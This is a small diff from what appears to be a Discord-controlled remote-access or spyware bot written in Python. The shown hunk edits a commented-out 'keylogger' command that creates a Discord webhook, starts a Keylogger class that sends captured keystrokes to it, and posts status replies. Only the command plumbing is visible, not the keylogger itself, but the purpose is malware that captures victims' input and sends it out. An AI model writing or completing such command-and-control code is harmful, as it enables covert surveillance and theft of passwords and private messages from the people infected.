@@ -322,12 +322,17 @@ async def on_message(message):
         await client.close()
 
     #elif message.content == "keylogger":
+    #    await message.reply("Creating new webhook for keylogger...")
     #    try:
     #        webhook = await message.channel.create_webhook(name="Keylogger").url
+    #        await message.reply(f"Created webhook, using URL: {webhook}")
     #        Keylogger(webhook).run()
     #    except:
     #        return
-        
+    #    
+    #    await message.reply("Keylogger enabled!")
+       
+       
     else:
         embed = discord.Embed(title="Error", description="```Unknown command, use 'help' for full list of commands!```", color=0xfafafa)
         await message.reply(embed=embed)
